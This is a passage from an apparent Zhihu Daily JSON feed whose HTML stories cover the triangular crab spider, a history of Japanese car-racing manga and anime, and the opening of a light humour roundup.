href=\"https://www.zhihu.com/question/20716696\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737861"},{"title":"有哪些长相比较逆天的昆虫？","date":"2021-07-07 23:06:27","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-9f00f638c8ea3ae209cc19762f245539_l.jpg?source=8673f162\"><span>地平线HOA，</span><span>简单、有趣、认真的科普。『公众号同名』</span>\n<a href=\"https://www.zhihu.com/question/37368107/answer/1978218850\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>“恐…恐怖机器人？”</strong></p>\n<p><strong>1.“真实的”科普</strong></p>\n<p>前两天在路边一块大石头上，看到这么个玩意儿↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7ecc1115317455aab5c5f7cb5ef3aa8b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>睿智的我果断求助了朋友圈的大佬：</p>\n<blockquote>——“这啥啊？”<br><br><br>——“小…螃蟹？”<br><br>——“小蜘蛛？”<br><br>——“别瞎说，蜘蛛八条腿！”<br><br>——“看着像个昆虫幼虫？”<br>——“某不知名海洋生物？”<br><br>……<br><br><br>——“额，<strong>恐怖机器人？</strong>”</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-acdb98fa4f45ea269d82a94b9e2e5dd7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8aeebf77700772e27ca4cf397d826808_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>（别说，还挺像的…）</strong></p>\n<p><strong>2.身背白面馍馍的三角脸星人</strong></p>\n<p>这个东东叫<strong>“三角蟹蛛”</strong>，拉丁学名<em>Thomisus labefactus</em>，普遍分布于平地至低海拔山区。</p>\n<p>“三角蟹蛛”这个名字取得是相当的传神，把它的两个特点概括得清清楚楚：</p>\n<p>①三角脸↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-67335dc2d28484c4d4fa7fb446dcc8dc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不禁让人联想到↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-df872c6f36c0ded0cdf86d8b8547a052_720w.jpg?source=8673f162\" alt=\"\"></figure><p>②远看像个小螃蟹↓</p>\n<p>（尤其是前面两对“胳膊”合起来的时候）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-60b40640bc3cf24b33494ede29bcb17f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>人们对蜘蛛通常有两个印象：<strong>有毒</strong>、<strong>结网</strong>。好巧不巧，这俩特征三角蟹蛛都没沾上。</p>\n<p>不过，你要是认为三角蟹蛛性情温顺那就错了，它可是个狠角色。如果说一般的蜘蛛靠毒液和蛛网安静地“务农”，那么三角蟹蛛就是一个四处游荡、以小博大的“猎手”。</p>\n<p>三角蟹蛛长得很“迷你”，最大的个体也就 1 厘米左右。虽然的个头虽然比较捉急，它却能猎捕大自己好几倍的昆虫，比如蝴蝶、飞蛾、蜜蜂等等。</p>\n<p>它们是耐心的猎手，静静在花朵上潜伏着……</p>\n<p>机会来了！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b07d113eca0ce156c8ce61f1a1f03152_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a81bf85b76c44c24146c623555c22ce8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-5b881ad357239ec4052384ac4e512813_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三角蟹蛛的雌雄个体差异很大。</strong></p>\n<p>和雄性相比，雌性三角蟹蛛的体型大得多：成年雌性能长到 12mm，而雄性一般不会超过 5mm。</p>\n<p>除了体型，雌雄个体的颜色差异更明显。雌性以白色为主，而雄性大多以棕褐色为主。</p>\n<p><em>雄性</em></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1cd3965cfcb22e2cb1577b9170f28560_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a55c199738e96789696adc39bfb8d7e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><em>雌性</em></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-78494fdcf702ff875005691ec6f1c61c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>乍一看简直是两个物种……</p>\n<p>其实，抛开那些固有偏见，这些小家伙还是挺可爱的。如果你想知道，它们的确可以做<strong>暂时的宠物</strong>。</p>\n<p>为什么是暂时的呢？</p>\n<p>因为三角蟹蛛的生命很短暂，大概只有三个多月的时间。</p>\n<p>它们通常在每年的 6 月至 9 月活动，中间的 7 月到 8 月则用来繁衍后代。这个时候，雌蛛会把叶子卷成粽形的巢，然后在里面产卵。</p>\n<p>比较特别的是，小宝宝出生后不会马上开始发育，而是越过冬天后，在次年 6 月开始生长。<em>（这个说法来自拓展阅读 2，但暂时没有找到其他佐证，存疑）</em></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6cc5877ec9410fb59483e5fcbea24f4d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>疑似在卿卿我我的雌雄个体↑</p>\n<p><strong>拓展阅读：</strong></p>\n<p>1. <em>香港常见蜘蛛网，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//hkspider.owlhk.org/spider/thomisus-labefactus\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>hkspider.owlhk.org/spid</span><span>er/thomisus-labefactus</span><span></span></a></p>\n<p>2. <em>ーモアセンスのある顔の蜘蛛！！『アズチグモ』，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//konchulivetogether.com/thomisus-labefactus/%23toc2\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>konchulivetogether.com/</span><span>thomisus-labefactus/#toc2</span><span></span></a></p>\n<p>3. <em>三角蟹蛛 Thomisus labefactus Karsch, 1881，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//gaga.biodiv.tw/new23/9402/36.htm\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>gaga.biodiv.tw/new23/94</span><span>02/36.htm</span><span></span></a></p>\n<p><strong>©版权所有，转载请后台留言申请</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/37368107\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737874"},{"title":"除了《头文字 D》还有哪些经典的汽车题材漫画？","date":"2021-07-07 23:06:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-9d52de5b9496a5c55533425e79b6f428_l.jpg?source=8673f162\"><span>彬帝，</span><span>漫画爱好者，钟爱盘点类回答</span>\n<a href=\"https://www.zhihu.com/question/60780485/answer/1977925382\" hidden>阅读原文</a>\n</div>\n<div>\n<p>除了 <a href=\"http://www.zhihu.com/people/5b4c4c40369aa3294b09f8e4bd715f23\">@孟德尔</a> 书记提到的《湾岸竞速 MIDNIGHT》外，我再补充几部我知晓的</p>\n<p><strong><strong>四驱兄弟</strong></strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f48da9214059bb834d5aeea1dffcc54f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>赛道之狼</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b93e94634d47841fa58c65e66ed915eb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>超时空甩尾</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4b57ab9869d0ea01946a9b2ccbedb92b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>极速方程式</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-83a4a19996217cc507d381a1c7cc8baa_720w.jpg?source=8673f162\" alt=\"\"></figure><p>关于汽车题材的漫画，之前看过一篇不错的文章分享给大家</p>\n<p>原文链接：<a href=\"http://link.zhihu.com/?target=http%3A//cache.baiducontent.com/c%3Fm%3D92Cv8o8i192KDvu1KahMiz8njRB7ScqokVoLpZaPkLSbVdjqtbODrW1v2FEY0CMZkxRARkiW466vWzNRaclj16-xriHVOdFWBEsw_-V1WbloqIZYuFZcoprkI5Ma7C3Ng0cohhoJdPIC5H8DYGAss_%26p%3D927dc54ad5c346f742bfd32d02148b%26newp%3D907dc54ad5c346b90be2962b4a549f231610db2151d4d701298ffe0cc4241a1a1a3aecbf2c281204d4c67c6d05a4485becf133723d0034f1f689df08d2ecce7e39%26s%3Dcfcd208495d565ef%26user%3Dbaidu%26fm%3Dsc%26query%3D%25C8%25FC%25B5%25C0%25D6%25AE%25C0%25C7%26qid%3Dec502c51004835f0%26p1%3D1\" target=\"_blank\" rel=\"nofollow noreferrer\">不是只有《头文字 D》的秋名山才有老司机_漫画</a></p>\n<p><strong>·汽车漫画是什么时候兴起的?</strong></p>\n<p>说到漫画中的汽车，要追溯到 20 世纪初。汽车诞生初期它就走进漫画了，不过当时还不是主角，只是在一些描写现实生活、讽刺社会现状的漫画中带有一些有汽车的情节。日本漫画祖师级人物北泽乐天笔下的漫画里就出现过不少汽车相关的故事，应该算是汽车漫画的起源。</p>\n<p>说北泽乐天可能比较陌生，但要是说漫画之神手冢治虫都是受他影响，这个人的地位就清楚了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0121ab0a29cd983c920dd64a863aa91d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>20 世纪初北泽的漫画以政治讽刺为主，里面描写过当时权贵有汽车的时代，汽车与庶民间的关系，用一系列小人物的故事来表现平民对汽车的看法与感情，算是最早的汽车相关漫画。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0f92f830e79958d9de9de297431ce626_720w.jpg?source=8673f162\" alt=\"\"></figure><p>随着时代的发展，漫画在日本形成一种文化，几乎任何东西都可以成为漫画的主题和元素，汽车也不例外。汽车真正成为漫画的主角还要追溯到 20 世纪 60 年代，一些机甲类的科幻作品涌现，同时也有一些描写赛车比赛的漫画出现。1960 年漫画《少年 No.1》开始连载，标志着以汽车作为主题的漫画正式登上历史的舞台。单就日本漫画史来说，这应该是最早的以汽车作为主题的漫画作品。</p>\n<p>这部作品以勒芒赛车、方程式赛车为故事主线，开创了汽车类漫画的先河。当年这部漫画被誉为日本第一的赛车漫画。直至今日，还能购买到复刻版的《少年 No.1》漫画，可见它在漫画历史上也是举足轻重的一部作品。经过它的影响，令其他漫画家也开始创作汽车漫画。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dc09338e89d5c5e9f293440ad05fcbfa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b81a98536ed4e5d2b297cc0462a25565_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《少年 No.1》不仅是汽车类漫画的启蒙，它也为第一部风靡世界的汽车动画做出了铺垫。经过《少年 No.1》 时代，汽车漫画的情节、画风都得到了肯定。紧随其后漫画《王牌车手》开始连载，并获得更好的反响于是被拍成了动画《马赫 5 号》（也叫马赫 Go，日语 Go 与 5 同音）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a83ef2cb3b8e9f78099ef7dcc68db6ad_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>·第一部风靡全球的汽车动漫竟然不是《头文字 D》？</strong></p>\n<p>说到风靡全球的汽车动漫，可能大家第一个想到的是《头文字 D》，或者是《变形金刚》，毕竟这些离我们近一点。时光倒退个四、五十年，那时候日本就有一部以汽车为主题的动漫火遍了全球：《马赫五号》。</p>\n<p>这是一部美式风格的赛车冒险故事。主人公三船刚和一部拥有七种特殊功能的赛车马赫号，在世界各地参加比赛，粉碎恶势力的阴谋成为这部动画的主旋律。在情节上还不是单纯的赛车，当时比较流行的就是加入冒险元素，还记得 80 年代的汽车类电视剧《霹雳游侠》吗，一样是汽车加冒险。为什么说这部作品是美式风格呢，因为主角一家都很美国化，家庭人员的组成、服装搭配以及住宅都很美国化，应该是与当时的日本社会环境有关。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f53fc63c2f3d8e2d894739428d7337fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>60、70 年代连法拉利都热衷于参加勒芒，于是这部漫画中有不少勒芒赛车的影子，情节上也与法拉利、福特等勒芒赛车交过手。车辆选择上几乎没有日本车元素。主角车型的设计也比较偏向当时的勒芒赛车。</p>\n<p>这辆车拥有七种特殊功能，这个创意在当时确实难得，加上冒险式的赛车故事，也虏获了不少车迷以外的观众。这七种功能分别为：按钮 A 伸出四根千斤顶让车跳跃、按钮 B 是轮胎保护带可以防弹、越野、按钮 C 为能电锯，用于切割障碍物、按钮 D 是防弹盾牌让敞篷车变成硬顶车、按钮 E 能让车灯射出红外线夜视、按钮 F 能给车内产生氧气并伸出潜望镜、按钮 G 能弹射无线电操作的通信小飞机。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-da6fb94adbf7763f443bf47a7239480a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这部动画很快火遍全球，在多个国家上映，其中也包括中国。国内的版本是引进的美国版本《Super Racer》。此外，正因为这部片子非常火，大众还趁机拿来宣传高尔夫，拍摄了主角驾驶高尔夫的广告短片。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-66844516328bdfd42305f4d02b5caf0e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>除了大众，雪佛兰克尔维特也在 2001 年推出过《马赫 5 号》限量版车型，总数 100 辆。</p>\n<p>看到这儿是不是觉得这部动画很眼熟，确实它有不少衍生作品，除了 97 年翻拍过一次改名叫《超级麦哈号》外，近年来也出过真人电影版《极速赛车手》。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-15ad2b16807c1d49298ca6964103c1ca_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-fc205135f9385c2d73f2b077d1c96513_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《马赫 5 号》的成功标志着日本汽车类漫画进入黎明期。</p>\n<p>经过了汽车类漫画的黎明期，许多漫画家都受到了启发与影响，于是更多的汽车类漫画开始涌现出来。当时的日本汽车工业也正处于发展期，不管是在世界上还是日本国内认可度都不算太高，日本民众也普遍喜爱进口车，更崇拜欧美的高档车。20 世纪 70 年法拉利和兰博基尼、保时捷等以跑车著称的厂家正推出一系列经典的车型，同时期的日本也处在一个疯狂追逐超级跑车的环境，这个时候《<strong>赛道之狼</strong>》诞生了，这部漫画包含了街头赛车、警匪追逐以及赛道比赛多种元素，精彩程度不亚于现在的《头文字 D》和《湾岸 Midnight》。</p>\n<p>《<strong>赛道之狼</strong>》因主角风吹裕矢赛车像飞驰的狼而得名。初期以街头赛车为主，对手都是法拉利、兰博等超跑，中后期情节转向赛道及方程式赛车。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5e288576a5805e26f1f18bcdacbbe52c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当时的日本车实力一般，受环境影响，漫画中的主角们都驾驶着进口跑车 :保时捷 911、Dino 246GT、兰博基尼康塔什等，几乎没有日本车的一席之地。我的一位日本朋友，曾经是三菱的员工，参与过 4G63 的开发，还是多代 EVO 的企划负责人，他在那个年代也是深受这些动漫的影响，甚至有段时间一下子买过两台保时捷 911。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-82fe93e7507297064477744e07e92afe_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不久前曾经做过《铁臂阿童木》、《鲁邦三世》等经典动画制品人的黑川庆二郎在采访中还说过这段历史：日本的动漫产业，就是一个给人以梦想的产业。他的朋友著名漫画家池泽早人师的作品——《<strong>赛道之狼</strong>》，讲述了一名赛车手的成长史，里面有很多跑车登场，法拉利、保时捷、兰博基尼、路特斯、玛莎拉蒂等，当时很多青少年都因为看了这部漫画连载，就想做和汽车相关的工作。他们当中有的做上了汽车设计者，有的做上了汽车修理工、汽车推销员等。正因为有他们，日本的汽车产业才能做到世界前列。</p>\n<p>这部漫画的知名度后来不断的提升，加上情节上的需要，才有了像丰田 2000GT、日产 240Z 这样的日本本土 GT 跑车加入到故事中。以当时的环境来看，日本车厂在跑车方面没有什么大的建树，这部漫画的不仅为厂家做出了一定的宣传，同时也推动了厂家的发展。</p>\n<p>《<strong>赛道之狼</strong>》这次不仅让小孩开始迷上汽车，同时也适用成年人，同样的也被搬上过荧幕，拍成真人电影，这个可比《头文字 D》早上 20 年。</p>\n<p>那个年代的赛车电影，请的著名车手比明星都多，虽然《头文字 D》拍摄时大家都经过了一些基础的培训，但跟这些职业车手比还是差的很远。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8e16909e2289d5fdae8cca76a50a1515_720w.jpg?source=8673f162\" alt=\"\"></figure><p>高桥国光：日系漂移创始人、参加过勒芒、全日本房车锦标赛等，至今还活跃在赛场上，跑跑小比赛。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e40633228b66e8c3935b48a0484aaf50_720w.jpg?source=8673f162\" alt=\"\"></figure><p>星野一义：外号日本最速男，驾驶 GT-R R32 做出连胜纪录的人，曾出战过 F1 日本站（当时是真年轻....一点都不胖）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d1f610bc0ed168e00a44b225a79d71f7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中岛悟：日本历史上第一位 F1 车手，参与过不少本田跑车的开发。他儿子也开过 F1，勒芒等世界级大赛。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-14b19840ea3adca571384cfbf17d18a8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>长谷见昌弘：东望洋 R32 的故事大家都听说过吧，说的就是他。</p>\n<p>出镜的车可比 AE86 要稀有的多的多。AE86 现在在祖国大地还能见到上牌的合法车，《<strong>赛道之狼</strong>》里的车估计不少都只能在博物馆里看看了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8c5199ddd4f45fa072de9110497f90c3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>作为汽车漫画史上的一个里程碑，最后还专门建立了一座《<strong>赛道之狼</strong>》博物馆，里面展示了漫画中出现过的车子，并且按照漫画的样子进行真实还原。由此可见这部作品的影响力有多大。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d47ee41eeff1ecae19632f088a3ac194_720w.jpg?source=8673f162\" alt=\"\"></figure><p>博物馆中的车辆都是按照作者笔下的样子进行改装，其中不乏兰博基尼 Muria、法拉利 Dino 这些极其少见的超跑。70 年代日本玩具业发达的时候还因为这部作品导致汽车模型与传统玩具市场互掐的局面。《<strong>赛道之狼</strong>》人气大涨后自 75 年起在日本掀起一阵前后约三年的超级跑车风潮，鼎盛期 77 年时，日本传统的角色玩具因超级跑车的大卖而遭受了很大打击。销量能比前一年下跌三成，大家都去买跑车模型了，别的都卖不动。</p>\n<p>这部作品不仅影响了漫画作家、喜欢机械的小孩儿和大人，毫不夸张的说，自此之后漫画也是支持日本汽车企业的一个重要工具。</p>\n<p><strong>·日本 F1 时代对汽车漫画的影响</strong></p>\n<p>1976 年，F1 开始增设日本站，比赛地点为富士高速赛道。当时还没有日本车手能参赛，但在民间已经掀起了一股向往 F1 比赛的浪潮。对，1976 年 F1 日本站，就是电影《Rush》中 James 和 Niki 雨中博弈的那一年。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b72e4c5af0335bd999c50bf2af79f13b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>F1 日本站举办的第二年就有新的汽车漫画就出现了，《红色天马》一部从真实的角度描写 F1 赛事的故事诞生。里面有大量车队、机械师、赛车开发相关的内容，给大家呈现出一个真实的 F1 世界。70 年代日本还没有 F1 车手，漫画中使用了 Ken 这个英籍日本人，架空的日本 F1 车队，及架空的 1977 年 F1 赛季，但却从真实的角度讲述 F1 的世界。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d3d9d00a5be67f4765de4b6d596db817_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然整个故事都是驾空的，但是里面出现了不少真实世界里的车手，包括 James 和 Niki，星野一义和高桥国光等。当时甚至有人觉得看漫画如同看 77 年的 F1 现场转播一样。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bc33cdcf6ed05a5b6e28e5a8ab19c1c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>现实中的比赛加上漫画的影响，相信当时不少人开始梦想成为车手，这就是汽车文化的影响力，谁能知道在十年后，就真的出现了日本的 F1 车手呢？1977 年之后 F1 日本站停办了许久，直至 1987 年才又大张旗鼓的重新举办起来。重办的同时，新的 F1 主题漫画《F》开始连载，与之前不同的是，这是以日本本土方程式车手成长为故事主线。</p>\n<p>《F》从主角赤木军马参加 FJ1600 低组别方程式比赛开始讲起，一直到进入 F1。故事的叙述非常像当时的日本车手。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b535653a51a331d9380bd168af2b6ef2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实这个故事的原型就是我朋友，日车赛车手中谷明彦。他就是从赤木军马这个年龄开始跑 FJ1600 方程式，且第一站就是杆位，并且得了第一名。但他与军马不同的是，军马只是个高中没毕业，不懂理论硬上的赛车天才。中谷则是理论派车手，大学工科毕业。他在夺得 FJ1600 首战第一后，竟然拒绝了斯巴鲁车队的邀请，原因只为回大学写论文好毕业。不过好在最后跟军马一样，签</p>\n<p>约了 F1 车队。中谷曾经跟我说漫画里有他出镜....不过我一直没看到，应该在很后面了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7bd05fdc308b3c14e6377c2062ed22e7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中谷明彦，EVO5 到 10 代的开发测试车手、LFA 纽北版开发测试车手</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-dac285a1b5981057e49dd7fdd576163e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>FJ1600</p>\n<p>这部漫画也拍成动画，并且引进过中国，不过只是 FJ1600 到 F3 这阶段，剩下只有看漫画。</p>\n<p>《F》推出时据《红色天马》已经有十年之久，这时日本第一位 F1 正式车手诞生，中岛悟出任路特斯车队的正式车手。随着同类别的赛车主题漫画、动画越来越多，之后日本也不断有新的 F1 车手出现，更有不少年轻人受漫画与动画的启蒙，立志成为一名赛车手。此时，汽车漫画已经进入全盛时期，汽车漫画文化开始对汽车从业者产生影响。</p>\n<p>在 F1 停办的那几年中，70 年代末 80 年代初有一部讲汽车技师的漫画出现，名字叫《车博士》/《车医生》，漫画从汽车机械师的角度来描写，里面有大量改装汽车、自己动手摆弄汽车的情节。漫画推出之后，日本社会中就开始流行自己动手研究自己的车，改装的风潮也就开始兴起。以往的赛车漫画都以车手为主视角，这一次则从机械师的角度来讲赛车、讲改装。人们对车的认知又从赛车场上回到的生活中。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f63c54ddae2d323dc50df7b9669aea05_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在日本的改装史上，改装也确实兴起与那个年代。80 年代日本国产车的更新换代期，大量的涡轮增压车型出现，各厂家间都在拼最大马力，一时间拉开“马力战争”的序幕。同时，大量的街头车手涌现，更多的人希望有更高性能，更好操控性的车子。</p>\n<p>从这部漫画起，80 年代的日系跑车才大量的出现在漫画中。故事也从离人们较远的高等级比赛转移到房车赛上。与车互动的情节也越来越多。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-55b0f4e0479cd870831e542aa3beeb57_720w.jpg?source=8673f162\" alt=\"\"></figure><p>诞生于那个年代的日本跑车确实不少，淑女 Z FairLady、广岛保时捷 RX-7 还有 Celica、S800 等。这些车虽说是跑车，但在诞生之时都比较弱，为了能和欧美跑车相媲美，大家才会去改装。</p>\n<p>这部《车博士》的漫画就描绘了这样的一个时代，为了更强劲的动力以及更好的操控性，不惜一切改装自己的车子。漫画中展现了以前汽车漫画都少有的汽车专业知识，自这部漫画起，汽车漫画的格局又一次发生了改变。也正是从这个时候开始，日本车厂争相推出高性能跑车，不计成本的研发高级跑车。有了这样的铺垫，才有了 90 年风起云涌的日系性能车黄金年代，也正因为有了“马力战争”才有了后来 280 马力的君子协定。</p>\n<p>虽然 80 年还有与汽车有关的一个动画风靡全球，但因为主题以拯救世界为主，并且是欧美动漫，就不在这做讨论了，没错我说的就是《变形金刚》。</p>\n<p><strong>·“街头赛车”源自生活更高于生活</strong></p>\n<p>再往后的汽车类漫画发展，与最初的时候相比就像反过来了，以前是漫画影响现实，后来则是通过现实创作漫画。80 年代末的日本社会上的暴走族，以及被成为“走り屋”的飞车党出现在人们的视野里，于是漫画家将这种社会现状进行艺术加工形成了新的故事，20 世纪末两大影响了世界车迷的故事诞生，一个叫《湾岸 Midnight》，另一个就是大街熟知的《头文字 D》。</p>\n<p>《湾岸 Midnight》比《头文字 D》还要早近十年的时间，因为 80 年代飞车族争相改装跑车想在湾岸跑出 300 公里 / 小时以上的时速，才有了这个题材。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a879c85a22b0d7531a0cae201a7526e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-5b69d427d89d2f9f9b458ba16e2ba5ac_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然现实中也有湾岸的飞车党，也确实跑到过动画中的程度，但是动画有时候也有些过度描写。还有《头文字 D》也是一样，虽然源自生活，却高于生活，里面大量的情节都太过神话，不管是车辆性能还是比赛情节都过于理想化。中谷明彦做为《头文字 D》中的故事原型也坦言里面大量的飙车情节有些过分夸张，只是为了达到漫画的效果而已，毕竟漫画存在的意义有时候也是为了实现现实中不太好实现的事情。《湾岸 Midnight》和《头文字 D》中有着大量现实中身边的汽车，这也让读者们更有了代入感，同时也令各车厂的车型地位提升，比如丰田 AE86。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2eb4ac6ffbe61cd122df8b83ac290180_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《头文字 D》是汽车漫画在全球范围内引起热潮的第二个作品，它的影响力一点不亚于《马赫 5 号》，它让世界各地的车迷都知道有一款车叫 86；有一座山叫秋名山；有一种驾驶技术叫漂移。它衍生出来的周边不仅有动画，也推出了电影，不仅有街机游戏，还有各式各样的模型。世界各地即将进入废车场的老日系性能车也因它有了第二次生命，被车迷挽救回来模仿着漫画改装的焕然一新。丰田也因这部漫画的热潮决定重返运动车市场研发了丰田 86，继续发扬“86”这个极具象征意义的名号。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-91bb2a310e596b41142e45f67dcf154c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>丰田 86 就是动漫推动汽车发展最好的证明，丰田不惜一切的复活 86 这个名号也确实是因为动漫给它带来了意想不到的明星效应。</p>\n<p>除了这两个现实取向的汽车类动画外，还有一个超现实的赛车主题动画《高智能方程式》，带有人工智能的赛车，千奇百怪的变形系统，在未来取代 F1 成为世界最高界别赛事。故事的设定在 2014 起到 2022 年，虽然现在赛车还没有跑到 600-700 的时速，但是动画中的很多科技都已经得到了实现。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-980688c69d0f3d0435b81bb50586aecf_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在整个 80、90 到 00 年代有不少新汽车类漫画出现，只是有的缺少动画，所以知道的人不多。比如《SS》、《极速方程式》等等。另外还有些四驱车的动画也曾经在国内非常火，不管是早期的《四驱郎》还有后来《四驱兄弟》都让人们对汽车产生了兴趣。最后放上一张汽车类漫画发展年表：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-818ba148c007bd9bbe8899d3eda00b49_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-61aa7956f2c50414d6e060c993ac861f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实有时候大家谈起汽车文化会觉得空洞，觉得张口闭口的汽车文化缺乏内涵，但今天聊的这些就是真正的汽车文化，在这些文化影响下，才有了现实中的汽车大国。希望未来国内也能有空前繁荣的汽车文化出现，不仅可以带动自主品牌的崛起，也可以为了以后的汽车事业培养出更多热爱汽车的新人。</p>\n<p>以上</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/60780485\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737865"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-07 23:06:15","description":"\n<div>\n<h2>送女朋友拼好的乐高城堡算直男行为吗？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>Jxxxx，</span><span>大学生</span>\n<a href=\"https://www.zhihu.com/question/416541593/answer/1975312580\" hidden>阅读原文</a>\n</div>\n<div>\n<p>前天晚上和男朋友一起拼了乐高的迪士尼城堡的一小小小半，然后就让他带回家了，约好下次出来再一起拼。今天打视频电话的时候发现，他自己一个人基本拼完了，留了个副塔尖尖给我，说是防止我生气给我留的......</p>\n<p>看到基本成品的那一刻脑袋真实的嗡嗡响，他送我的时候说的那句「我们一起拼，拼完你就住进去！」一直在脑子里面回荡。我不想要吵架，不想让他觉得我无理取闹，但我实在觉得恶心，甚至整个城堡都不想要了。</p>\n<p>拼都拼完了给我干什么？我顶多算个给城堡打地基的建筑工人，我是个住不进城堡的公主病。对我来说，这个迪士尼城堡是他的又一个乐高玩具，不是我们的城堡。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/416541593\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>敖丙为什么打不赢哪吒？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-4c57ebb54e590886da56bba477298674_l.jpg?source=8673f162\"><span>柒个葫芦，</span><span>想恋爱</span>\n<a href=\"https://www.zhihu.com/question/338438233/answer/778221253\" hidden>阅读原文</a>\n</div>\n<div>\n<p>片名已经告诉你了，叫哪吒之魔童降世，不是叫敖丙之灵珠崛起</p>\n</div>\n</div>\n<div><a 